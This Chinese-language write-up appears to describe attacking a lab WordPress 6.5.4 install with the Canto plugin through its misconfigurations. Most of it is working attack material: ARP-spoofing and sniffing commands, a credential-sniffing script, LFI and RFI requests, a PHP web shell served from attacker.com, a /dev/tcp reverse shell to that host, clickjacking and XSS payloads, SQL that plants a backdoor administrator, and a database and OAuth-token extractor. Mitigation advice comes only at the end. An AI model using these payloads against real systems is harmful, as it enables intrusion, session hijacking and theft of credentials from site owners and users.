# WordPress 安全配置错误攻击

## 1. 概述

### 1.1 漏洞描述

WordPress 6.5.4 应用及其 Canto DAM 插件 v3.0.4 存在多个严重的安全配置错误，包括 HTTP-only 部署、明文凭证存储、缺失安全响应头、PHP 危险配置等。这些配置错误单独或组合使用可导致凭证窃取、会话劫持和系统入侵。

### 1.2 受影响组件

| 配置项 | 问题 | 严重等级 | 影响 |
|--------|------|---------|------|
| HTTPS/TLS | 未配置（HTTP-only） | Critical | 凭证/会话明文传输 |
| 数据库凭证 | 明文存储在 wp-config.php | High | 数据库泄露 |
| OAuth Token | 明文存储在 wp_options 表 | High | 第三方 API 访问 |
| 安全响应头 | 全部缺失 | Medium | XSS/点击劫持风险 |
| Cookie Secure 标志 | 未设置 | High | 会话明文传输 |
| Cookie SameSite 标志 | 未设置 | High | CSRF 攻击 |
| allow_url_include | On（危险配置） | Critical | 远程代码执行 |
| 目录列表 | 可能启用 | Medium | 信息泄露 |

### 1.3 配置错误详情

**wp-config.php 明文凭证：**
```php
// /app/html/wp-config.php 第 30-33 行
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');  // 明文密码
define('DB_HOST', '127.0.0.1');
```

**PHP 危险配置：**
```ini
; /etc/php/7.4/apache2/php.ini
allow_url_include = On  ; 启用远程文件包含
allow_url_fopen = On    ; 启用远程文件访问
```

**缺失安全响应头：**
```
# 响应头分析（全部缺失）
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 2. HTTP-only 部署攻击

### 2.1 漏洞原理

**问题描述：**
WordPress 应用仅通过 HTTP 运行（端口 35995），无 HTTPS/TLS 加密，导致：
- 所有通信明文传输
- 凭证可被网络嗅探
- 会话 Cookie 可被拦截
- 无 HSTS 保护

**配置证据：**
```bash
# Apache 配置（仅 HTTP）
curl -I "http://target:35995/wp-login.php"
# 响应：HTTP/1.1 200 OK（无 HTTPS 重定向）

# 检查 HTTPS 端口
nmap -p 443 target
# 结果：443/tcp closed（无 HTTPS）
```

### 2.2 凭证拦截攻击

**网络嗅探方法：**
```bash
# 使用 tcpdump 捕获明文凭证
sudo tcpdump -i eth0 -A 'tcp port 35995 and (dst host target_ip)' \
  | grep -E "POST.*wp-login.php" -A 20

# 使用 Wireshark 过滤
# 过滤器：http.request.method == "POST" && http.request.uri contains "wp-login"
```

**ARP 欺骗 + 凭证窃取：**
```bash
# 1. 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP 欺骗（中间人位置）
arpspoof -i eth0 -t victim_ip gateway
arpspoof -i eth0 -t gateway victim_ip

# 3. 使用 BetterCAP 自动捕获凭证
bettercap -iface eth0

# 在 bettercap 交互界面：
set arp.spoof.targets victim_ip
arp.spoof on
set http.proxy.captive_portal true
http.proxy on

# 当受害者登录时，凭证将显示在 bettercap 界面
```

**凭证提取脚本：**
```python
#!/usr/bin/env python3
import subprocess
import re

# 启动 tcpdump 捕获 HTTP POST 数据
process = subprocess.Popen(
    ['tcpdump', '-i', 'eth0', '-A', 'tcp port 35995'],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

print("[*] Listening for WordPress credentials...")

try:
    for line in process.stdout:
        line = line.decode('utf-8', errors='ignore')
        
        # 查找登录凭证
        if 'wp-login.php' in line and 'POST' in line:
            print("[*] Login attempt detected!")
        
        # 提取用户名
        if 'log=' in line:
            username = re.search(r'log=([^&\s]+)', line)
            if username:
                print(f"[+] Username: {username.group(1)}")
        
        # 提取密码
        if 'pwd=' in line:
            password = re.search(r'pwd=([^&\s]+)', line)
            if password:
                print(f"[+] Password: {password.group(1)}")
                
except KeyboardInterrupt:
    process.terminate()
    print("\n[*] Stopped listening")
```

### 2.3 会话劫持攻击

**Cookie 拦截：**
```bash
# 捕获 WordPress 会话 Cookie
sudo tcpdump -i eth0 -A 'tcp port 35995' \
  | grep -E "Set-Cookie: wordpress_logged_in" -A 2

# 预期输出：
# Set-Cookie: wordpress_logged_in_abc123=username|expiration|token|hmac; path=/; HttpOnly
# 注意：无 Secure 标志，无 SameSite 标志
```

**Cookie 重放攻击：**
```bash
# 使用窃取的 Cookie 访问管理界面
curl -b "wordpress_logged_in_abc123=stolen_token" \
  "http://target:35995/wp-admin/"

# 如果 Cookie 有效，将直接访问管理界面
```

---

## 3. 明文凭证存储攻击

### 3.1 数据库凭证提取

**通过 LFI 读取 wp-config.php：**
```bash
# 使用 Canto 插件 LFI 漏洞
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"

# 预期输出：
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
define('DB_HOST', '127.0.0.1');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');

define('AUTH_KEY',         '...');
define('SECURE_AUTH_KEY',  '...');
define('LOGGED_IN_KEY',    '...');
define('NONCE_KEY',        '...');
// ... 更多密钥
```

**通过路径遍历读取：**
```bash
# Apache 2.4.49 路径遍历（CVE-2021-41773）
curl -s "http://target/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/wp-config.php"

# 直接路径遍历
curl -s "http://target/wp-config.php"
# 如果 Apache 配置错误，可能直接返回文件内容
```

### 3.2 OAuth Token 提取

**通过 LFI 读取数据库：**
```bash
# 使用 MySQL 凭证查询 wp_options 表
mysql -u wp_user -p'ThisIsNotPartOfTheChallenge!' wordpress \
  -e "SELECT option_value FROM wp_options WHERE option_name IN ('fbc_app_token', 'fbc_refresh_token', 'fbc_flight_domain', 'fbc_app_api')"

# 预期输出：
# +------------------+----------------------------------+
# | option_value     |                                  |
# +------------------+----------------------------------+
# | fbc_app_token    | legitimate_canto_access_token    |
# | fbc_refresh_token| legitimate_canto_refresh_token   |
# | fbc_flight_domain| mycompany                        |
# | fbc_app_api      | canto.com                        |
# +------------------+----------------------------------+
```

**OAuth Token 重放攻击：**
```bash
# 使用窃取的 OAuth Token 访问 Canto API
curl -H "Authorization: Bearer stolen_canto_token" \
  "https://mycompany.canto.com/api/v1/search"

# 可访问受害者 Canto 账户的所有媒体资源
```

### 3.3 环境变量明文存储

**Docker 环境变量提取：**
```bash
# 如果运行在 Docker 容器中，环境变量可能包含敏感信息
docker exec container_name env | grep -i "password\|secret\|key\|token"

# 读取 /proc/self/environ（如果可访问）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/proc/self/environ%00"

# 预期输出（包含环境变量）：
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# HOSTNAME=wordpress-container
# WORDPRESS_DB_PASSWORD=ThisIsNotPartOfTheChallenge!
# WORDPRESS_AUTH_KEY=...
```

---

## 4. 缺失安全响应头攻击

### 4.1 点击劫持攻击

**漏洞原理：**
缺失 `X-Frame-Options` 和 `Content-Security-Policy` 头，允许页面被嵌入到恶意 iframe 中。

**攻击页面：**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Legitimate Looking Page</title>
    <style>
        iframe {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.01;
            z-index: 1;
        }
        .overlay {
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 2;
            background: white;
            padding: 20px;
            border: 2px solid blue;
        }
    </style>
</head>
<body>
    <h1>Click anywhere to win a prize!</h1>
    <div class="overlay">
        <button>Click Here!</button>
    </div>
    
    <!-- WordPress 管理页面隐藏在下方 -->
    <iframe src="http://target/wp-admin/post.php?post=1&action=edit"></iframe>
</body>
</html>
```

**攻击效果：**
- 用户认为在点击奖励按钮
- 实际在 WordPress 管理页面执行操作
- 可能删除文章、修改设置、创建用户

### 4.2 MIME 嗅探攻击

**漏洞原理：**
缺失 `X-Content-Type-Options: nosniff` 头，浏览器可能错误解释响应内容。

**攻击方法：**
```bash
# 上传恶意文件（伪装为图片）
# 文件内容：
<img src="x" onerror="alert('XSS')">

# 服务器响应：
Content-Type: image/jpeg
# 但实际是 HTML

# 浏览器可能执行 HTML 中的 JavaScript
```

### 4.3 CSP 绕过攻击

**漏洞原理：**
缺失 `Content-Security-Policy` 头，允许执行任意内联脚本。

**XSS 攻击增强：**
```html
<!-- 无 CSP 时，以下 Payload 可执行 -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

---

## 5. PHP 危险配置攻击

### 5.1 allow_url_include=On 利用

**远程文件包含 (RFI)：**
```bash
# 创建恶意 PHP 文件
# attacker.com/shell.php
<?php system($_GET['cmd']); ?>

# 通过 LFI 包含远程文件
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=id"

# 执行任意命令
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=whoami"
# 输出：www-data
```

**反向 Shell：**
```bash
# 攻击者监听
nc -lvnp 4444

# 触发反向 Shell
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2Fattacker.com%2F4444+0%3E%261"
```

### 5.2 目录列表攻击

**检测目录列表：**
```bash
# 测试目录列表是否启用
curl -s "http://target/wp-content/uploads/" | grep -i "index of"

# 如果启用，可能看到所有上传文件
# 包括敏感文件、备份文件等
```

**利用目录列表：**
```bash
# 枚举上传目录
curl -s "http://target/wp-content/uploads/" \
  | grep -oP 'href="\K[^"]+\.(zip|bak|sql|txt|log)'

# 下载敏感文件
curl -s "http://target/wp-content/uploads/2024/01/backup.zip" -o backup.zip
curl -s "http://target/wp-content/uploads/2024/01/debug.log" -o debug.log
```

---

## 6. 组合攻击场景

### 6.1 HTTP-only + 凭证拦截 + 权限提升

**攻击流程：**

1. **网络位置准备**
```bash
# 攻击者连接到同一 WiFi 网络
# 或 ARP 欺骗进入中间人位置
```

2. **凭证拦截**
```bash
# 嗅探受害者登录
sudo tcpdump -i wlan0 -A 'tcp port 35995' | grep "pwd="

# 获得：wordpress_admin / Password123
```

3. **登录管理界面**
```bash
# 使用窃取的凭证登录
curl -c cookies.txt -X POST "http://target/wp-login.php" \
  -d "log=wordpress_admin&pwd=Password123"
```

4. **权限提升**
```bash
# 创建后门账户
curl -b cookies.txt "http://target/wp-admin/user-new.php" \
  -d "action=createuser&user_login=backdoor&email=attacker@evil.com&pass1=P@ssw0rd&role=administrator"
```

### 6.2 LFI + 明文凭证 + 数据库访问

**攻击流程：**

1. **通过 LFI 读取 wp-config.php**
```bash
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
# 获得：DB_USER=wp_user, DB_PASSWORD=ThisIsNotPartOfTheChallenge!
```

2. **连接数据库**
```bash
mysql -u wp_user -p'ThisIsNotPartOfTheChallenge!' wordpress
```

3. **提取所有用户会话**
```sql
SELECT meta_value FROM wp_usermeta WHERE meta_key = 'session_tokens';
```

4. **创建管理员账户**
```sql
INSERT INTO wp_users (user_login, user_pass, user_email, user_status) 
VALUES ('backdoor', MD5('P@ssw0rd123'), 'attacker@evil.com', 0);

INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

### 6.3 完整配置错误利用链

**场景：** 利用多个配置错误实现完全控制

```
1. HTTP-only 部署
   → 网络嗅探获得会话 Cookie

2. 缺失 SameSite Cookie
   → CSRF 攻击修改设置

3. allow_url_include=On
   → RFI 获得代码执行

4. 明文数据库凭证
   → 访问数据库提取所有数据

5. 缺失 CSP
   → XSS 攻击其他用户

6. 目录列表启用
   → 发现备份文件提取更多凭证
```

---

## 7. 自动化工具

### 7.1 配置错误扫描器

```python
#!/usr/bin/env python3
import requests
import json

class WordPressConfigScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.findings = []
        
    def check_https(self):
        """检查 HTTPS 配置"""
        print("[*] Checking HTTPS configuration...")
        
        # 测试 HTTP
        try:
            resp = self.session.get(f"http://{self.target}", timeout=10, allow_redirects=False)
            if resp.status_code == 200:
                self.findings.append({
                    'severity': 'HIGH',
                    'issue': 'HTTP-only deployment',
                    'detail': 'Site accessible over unencrypted HTTP'
                })
                print("[!] HIGH: HTTP-only deployment detected")
        except:
            pass
        
        # 测试 HTTPS
        try:
            resp = self.session.get(f"https://{self.target}", timeout=10, verify=False)
            if resp.status_code == 200:
                print("[+] HTTPS available")
            else:
                self.findings.append({
                    'severity': 'HIGH',
                    'issue': 'HTTPS not configured',
                    'detail': 'No HTTPS endpoint available'
                })
                print("[!] HIGH: HTTPS not configured")
        except:
            self.findings.append({
                'severity': 'HIGH',
                'issue': 'HTTPS not configured',
                'detail': 'No HTTPS endpoint available'
            })
            print("[!] HIGH: HTTPS not configured")
    
    def check_security_headers(self):
        """检查安全响应头"""
        print("[*] Checking security headers...")
        
        resp = self.session.get(f"http://{self.target}", timeout=10)
        
        required_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME sniffing protection',
            'X-XSS-Protection': 'XSS filter',
            'Content-Security-Policy': 'Content Security Policy',
            'Strict-Transport-Security': 'HSTS',
            'Referrer-Policy': 'Referrer policy'
        }
        
        for header, description in required_headers.items():
            if header not in resp.headers:
                self.findings.append({
                    'severity': 'MEDIUM',
                    'issue': f'Missing {header}',
                    'detail': description
                })
                print(f"[!] MEDIUM: Missing {header}")
            else:
                print(f"[+] {header} present")
    
    def check_cookie_flags(self):
        """检查 Cookie 安全标志"""
        print("[*] Checking cookie security flags...")
        
        resp = self.session.get(f"http://{self.target}/wp-login.php", timeout=10)
        
        for cookie in resp.cookies:
            if 'wordpress' in cookie.name:
                if not cookie.secure:
                    self.findings.append({
                        'severity': 'HIGH',
                        'issue': f'Cookie {cookie.name} missing Secure flag',
                        'detail': 'Cookie transmitted over HTTP'
                    })
                    print(f"[!] HIGH: {cookie.name} missing Secure flag")
                
                if not cookie.get_nonstandard_attr('SameSite'):
                    self.findings.append({
                        'severity': 'MEDIUM',
                        'issue': f'Cookie {cookie.name} missing SameSite attribute',
                        'detail': 'CSRF protection weakened'
                    })
                    print(f"[!] MEDIUM: {cookie.name} missing SameSite")
    
    def check_directory_listing(self):
        """检查目录列表"""
        print("[*] Checking directory listing...")
        
        dirs_to_test = [
            '/wp-content/uploads/',
            '/wp-content/plugins/',
            '/wp-content/themes/',
            '/wp-includes/'
        ]
        
        for dir_path in dirs_to_test:
            try:
                resp = self.session.get(f"http://{self.target}{dir_path}", timeout=10)
                if 'Index of' in resp.text or 'Directory listing' in resp.text:
                    self.findings.append({
                        'severity': 'MEDIUM',
                        'issue': f'Directory listing enabled at {dir_path}',
                        'detail': 'Sensitive files may be exposed'
                    })
                    print(f"[!] MEDIUM: Directory listing at {dir_path}")
            except:
                pass
    
    def scan(self):
        """执行完整扫描"""
        print(f"[*] Scanning WordPress configuration at {self.target}")
        print("=" * 60)
        
        self.check_https()
        self.check_security_headers()
        self.check_cookie_flags()
        self.check_directory_listing()
        
        print("=" * 60)
        print(f"[*] Found {len(self.findings)} security issues")
        
        # 输出 JSON 报告
        print("\n[*] JSON Report:")
        print(json.dumps(self.findings, indent=2))
        
        return self.findings

# 使用示例
scanner = WordPressConfigScanner("target:35995")
scanner.scan()
```

### 7.2 凭证提取工具

```python
#!/usr/bin/env python3
import requests
import re

class CredentialExtractor:
    def __init__(self, target, lfi_endpoint):
        self.target = target
        self.lfi = lfi_endpoint
        
    def extract_wp_config(self):
        """通过 LFI 提取 wp-config.php"""
        print("[*] Extracting wp-config.php...")
        
        payloads = [
            "/var/www/html/wp-config.php%00",
            "/var/www/html/wp-config.php",
            "/app/html/wp-config.php%00",
            "/home/www/wp-config.php%00"
        ]
        
        for payload in payloads:
            try:
                url = f"{self.lfi}?wp_abspath={payload}"
                resp = requests.get(url, timeout=10)
                
                if "DB_PASSWORD" in resp.text:
                    print("[+] Found wp-config.php!")
                    
                    # 提取数据库凭证
                    db_name = re.search(r"define\('DB_NAME',\s*'([^']+)'\)", resp.text)
                    db_user = re.search(r"define\('DB_USER',\s*'([^']+)'\)", resp.text)
                    db_pass = re.search(r"define\('DB_PASSWORD',\s*'([^']+)'\)", resp.text)
                    db_host = re.search(r"define\('DB_HOST',\s*'([^']+)'\)", resp.text)
                    
                    print(f"[*] DB_NAME: {db_name.group(1) if db_name else 'N/A'}")
                    print(f"[*] DB_USER: {db_user.group(1) if db_user else 'N/A'}")
                    print(f"[*] DB_PASSWORD: {db_pass.group(1) if db_pass else 'N/A'}")
                    print(f"[*] DB_HOST: {db_host.group(1) if db_host else 'N/A'}")
                    
                    return {
                        'name': db_name.group(1) if db_name else None,
                        'user': db_user.group(1) if db_user else None,
                        'password': db_pass.group(1) if db_pass else None,
                        'host': db_host.group(1) if db_host else None
                    }
            except Exception as e:
                print(f"[-] Error: {e}")
        
        print("[-] wp-config.php not found")
        return None
    
    def extract_oauth_tokens(self, db_creds):
        """从数据库提取 OAuth Token"""
        if not db_creds:
            print("[-] Need database credentials first")
            return None
        
        print("[*] Extracting OAuth tokens from database...")
        
        try:
            import mysql.connector
            conn = mysql.connector.connect(
                host=db_creds['host'],
                user=db_creds['user'],
                password=db_creds['password'],
                database=db_creds['name']
            )
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT option_name, option_value 
                FROM wp_options 
                WHERE option_name IN ('fbc_app_token', 'fbc_refresh_token', 'fbc_flight_domain', 'fbc_app_api')
            """)
            
            tokens = {}
            for name, value in cursor.fetchall():
                tokens[name] = value
                print(f"[*] {name}: {value[:20]}...")
            
            cursor.close()
            conn.close()
            return tokens
        except Exception as e:
            print(f"[-] Database error: {e}")
            return None

# 使用示例
extractor = CredentialExtractor("http://target", "http://target/wp-content/plugins/canto/includes/lib/get.php")
db_creds = extractor.extract_wp_config()
if db_creds:
    extractor.extract_oauth_tokens(db_creds)
```

---

## 8. 缓解措施

### 8.1 立即修复

**启用 HTTPS：**
```bash
# 安装 SSL 证书
apt-get install certbot python3-certbot-apache
certbot --apache -d target.com

# 强制 HTTPS 重定向
# Apache 配置
<VirtualHost *:80>
    ServerName target
    Redirect permanent / https://target/
</VirtualHost>
```

**修复 PHP 配置：**
```ini
; /etc/php/7.4/apache2/php.ini
allow_url_include = Off
allow_url_fopen = Off
expose_php = Off
display_errors = Off
log_errors = On
```

**添加安全响应头：**
```apache
# Apache .htaccess 或虚拟主机配置
<IfModule mod_headers.c>
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'"
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
</IfModule>
```

**保护 wp-config.php：**
```apache
# 禁止访问 wp-config.php
<Files wp-config.php>
    Order allow,deny
    Deny from all
</Files>
```

### 8.2 长期加固

**WordPress 安全配置：**
```php
// wp-config.php 添加
define('DISALLOW_FILE_EDIT', true);  // 禁用文件编辑
define('FORCE_SSL_ADMIN', true);      // 强制 HTTPS 管理
define('WP_HTTP_BLOCK_EXTERNAL', true); // 阻止外部 HTTP 请求
define('WP_AUTO_UPDATE_CORE', false);   // 禁用自动更新（手动控制）

// 移动 wp-config.php 到文档根目录外
// /var/www/wp-config.php (而不是 /var/www/html/wp-config.php)
```

**Cookie 安全加固：**
```php
// wp-config.php 添加
define('COOKIEHASH', 'random_hash_here');
define('COOKIEPATH', '/');
define('SITECOOKIEPATH', '/');

// functions.php 添加（强制 SameSite）
add_filter('cookie_set_flag', function($value, $cookie) {
    return $value . '; SameSite=Strict';
}, 10, 2);
```

**数据库凭证管理：**
```bash
# 使用环境变量（而不是硬编码）
# wp-config.php
define('DB_PASSWORD', getenv('WORDPRESS_DB_PASSWORD'));

# Docker 环境变量
docker run -e WORDPRESS_DB_PASSWORD=secure_password ...
```

---

## 9. 参考资源

- [OWASP Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [WordPress 安全加固指南](https://wordpress.org/support/article/hardening-wordpress/)
- [PHP 安全配置指南](https://www.php.net/manual/en/security.php)